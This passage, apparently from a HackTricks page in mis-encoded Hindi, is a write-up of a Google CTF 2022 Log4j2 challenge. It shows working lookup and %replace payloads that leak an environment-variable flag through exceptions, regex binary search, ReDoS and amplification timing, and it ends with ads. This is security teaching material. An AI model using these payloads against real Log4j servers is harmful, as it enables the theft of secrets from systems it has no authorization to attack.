рдЗрд╕ CTF рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдиреЗ `${sys:cmd}` рдХреЗ рдореВрд▓реНрдп рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдФрд░ рдЙрд╕реЗ рдПрдХ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рд╕реЗ рдзреНрд╡рдЬ рдХреЛ рдирд┐рдХрд╛рд▓рдирд╛ рдерд╛ред\
рдЗрд╕ рдкреГрд╖реНрда рдкрд░ [**рдкрд┐рдЫрд▓реЗ рдкреЗрд▓реЛрдбреНрд╕**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) рдореЗрдВ рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░реЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВ, рдЬреИрд╕реЗ: **`${env:FLAG}`**ред рдЗрд╕ CTF рдореЗрдВ рдпрд╣ рдмреЗрдХрд╛рд░ рдерд╛ рд▓реЗрдХрд┐рди рдЕрдиреНрдп рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЬреАрд╡рди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдРрд╕рд╛ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### рдЕрдкрд╡рд╛рджреЛрдВ рдореЗрдВ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд╕реА

CTF рдореЗрдВ, рдЖрдк **java рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ stderr рддрдХ рдкрд╣реБрдБрдЪ рдирд╣реАрдВ рд╕рдХрддреЗ рдереЗ** рдЬреЛ log4J рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рдерд╛, рд▓реЗрдХрд┐рди Log4J **рдЕрдкрд╡рд╛рдж stdout рдкрд░ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ**, рдЬреЛ рдХрд┐ python рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдкреНрд░рд┐рдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рдпрд╣ рдерд╛ рдХрд┐ рдПрдХ рдЕрдкрд╡рд╛рдж рдЯреНрд░рд┐рдЧрд░ рдХрд░рдХреЗ рд╣рдо рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рдереЗред рдзреНрд╡рдЬ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдкрд╡рд╛рдж рдерд╛: **`${java:${env:FLAG}}`.** рдпрд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **`${java:CTF{blahblah}}`** рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ рдФрд░ рдзреНрд╡рдЬ рдХреЗ рдореВрд▓реНрдп рдХреЗ рд╕рд╛рде рдПрдХ рдЕрдкрд╡рд╛рдж рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛:

![](<../../.gitbook/assets/image (157).png>)

### рдХрдиреНрд╡рд░реНрдЬрди рдкреИрдЯрд░реНрдиреНрд╕ рдЕрдкрд╡рд╛рдж

рдЗрд╕рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирдП [**рдХрдиреНрд╡рд░реНрдЬрди рдкреИрдЯрд░реНрдиреНрд╕**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдкрд╡рд╛рдж рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХрд┐ `stdout` рдкрд░ рд▓реЙрдЧ рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

рдпрд╣ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЗ рдЕрдВрджрд░ рддрд╛рд░реАрдЦ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рдкрд╛рдпрд╛ рдЧрдпрд╛, рдХреНрдпреЛрдВрдХрд┐ рд▓реБрдХрдЕрдк рдХрдиреНрд╡рд░реНрдЬрди рдкреИрдЯрд░реНрди рд╕реЗ рдкрд╣рд▓реЗ рд╣рд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рд▓реЗрдХрд┐рди рдпрд╣ рдЕрдиреНрдп рдЪреАрдЬреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдХрд┐ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ред

### рдХрдиреНрд╡рд░реНрдЬрди рдкреИрдЯрд░реНрдиреНрд╕ рд░реЗрдЧреЗрдХреНрд╕

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреБрдЫ **рдХрдиреНрд╡рд░реНрдЬрди рдкреИрдЯрд░реНрдиреНрд╕ рдЬреЛ рд░реЗрдЧреЗрдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реБрдХрдЕрдк рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИ рд░реЗрдЧреЗрдХреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдФрд░ **рдмрд╛рдЗрдирд░реА рд╕рд░реНрдЪ** рдпрд╛ **рд╕рдордп рдЖрдзрд╛рд░рд┐рдд** рд╡реНрдпрд╡рд╣рд╛рд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗред

* **рдЕрдкрд╡рд╛рдж рд╕рдВрджреЗрд╢реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмрд╛рдЗрдирд░реА рд╕рд░реНрдЪ**

рдХрдиреНрд╡рд░реНрдЬрди рдкреИрдЯрд░реНрди **`%replace`** рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕рд╛рдордЧреНрд░реА рдХреЛ рдмрджрд▓рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **рд╕реНрдЯреНрд░рд┐рдВрдЧ** рд╕реЗ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ **рд░реЗрдЧреЗрдХреНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдпрд╣ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ: `replace{pattern}{regex}{substitution}`\
рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк replace рдХреЛ **рдЯреНрд░рд┐рдЧрд░ рдПрдХ рдЕрдкрд╡рд╛рдж рдЕрдЧрд░ рд░реЗрдЧреЗрдХреНрд╕ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рднреА рдореИрдЪ рдХрд░рддрд╛ рд╣реИ** (рдФрд░ рдХреЛрдИ рдЕрдкрд╡рд╛рдж рдирд╣реАрдВ рдЕрдЧрд░ рдпрд╣ рдкрд╛рдпрд╛ рдирд╣реАрдВ рдЧрдпрд╛) рдЗрд╕ рдкреНрд░рдХрд╛рд░:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **рд╕рдордп рдЖрдзрд╛рд░рд┐рдд**

рдЬреИрд╕рд╛ рдХрд┐ рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, **`%replace`** **regexes** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП [**ReDoS рдкреЗрдЬ**](../regular-expression-denial-of-service-redos.md) рд╕реЗ рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлреНрд▓реИрдЧ рдорд┐рд▓рдиреЗ рдкрд░ **timeout** рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` рдЬреИрд╕рд╛ рдкреЗрд▓реЛрдб рдЙрд╕ CTF рдореЗрдВ **timeout** рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ред

рдЗрд╕ [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) рдореЗрдВ, ReDoS рд╣рдорд▓реЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп рдЗрд╕рдиреЗ рдПрдХ **amplification attack** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд┐рд╕рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╕рдордп рдЕрдВрддрд░ рд╣реЛрддрд╛ рд╣реИ:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> рдпрджрд┐ рдлреНрд▓реИрдЧ `flagGuess` рд╕реЗ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдкреВрд░рд╛ рдлреНрд▓реИрдЧ 29 `#`-s рд╕реЗ рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдореИрдВрдиреЗ рдЗрд╕ рдЕрдХреНрд╖рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдВрднрд╡рддрдГ рдлреНрд▓реИрдЧ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдирд╣реАрдВ рд╣реЛрдЧрд╛)ред **рдкреНрд░рддреНрдпреЗрдХ рдкрд░рд┐рдгрд╛рдореА 29 `#`-s рдХреЛ рдлрд┐рд░ 54 `#`-s рд╕реЗ рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ **6 рдмрд╛рд░** рджреЛрд╣рд░рд╛рдИ рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреБрд▓ `29*54*54^6* =`` `` `**`96816014208`  `#`-s!**
>
> рдЗрддрдиреЗ рд╕рд╛рд░реЗ `#`-s рдХреЛ рдмрджрд▓рдиреЗ рд╕реЗ Flask рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ 10-рд╕реЗрдХрдВрдб рдХреЗ timeout рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬрд┐рд╕рд╕реЗ рдмрджрд▓реЗ рдореЗрдВ HTTP рд╕реНрдерд┐рддрд┐ рдХреЛрдб 500 рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред (рдпрджрд┐ рдлреНрд▓реИрдЧ `flagGuess` рд╕реЗ рд╢реБрд░реВ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╣рдореЗрдВ рдПрдХ рдЧреИрд░-500 рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛)

## рд╕рдВрджрд░реНрдн

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬреЗрдВ рддрд╛рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рддреЗрдЬреА рд╕реЗ рдареАрдХ рдХрд░ рд╕рдХреЗрдВред Intruder рдЖрдкрдХреА рд╣рдорд▓реЗ рдХреА рд╕рддрд╣ рдХреЛ рдЯреНрд░реИрдХ рдХрд░рддрд╛ рд╣реИ, рд╕рдХреНрд░рд┐рдп рдЦрддрд░реЗ рдХреЗ рд╕реНрдХреИрди рдЪрд▓рд╛рддрд╛ рд╣реИ, рдЖрдкрдХреЗ рдкреВрд░реЗ рдЯреЗрдХ рд╕реНрдЯреИрдХ рдореЗрдВ рдореБрджреНрджреЛрдВ рдХреЛ рдвреВрдВрдврддрд╛ рд╣реИ, APIs рд╕реЗ рд▓реЗрдХрд░ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдореНрд╕ рддрдХред рдЖрдЬ рд╣реА [**рдореБрдлреНрдд рдореЗрдВ рдЗрд╕реЗ рдЖрдЬрдорд╛рдПрдВ**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ред

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** ЁЯРж рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
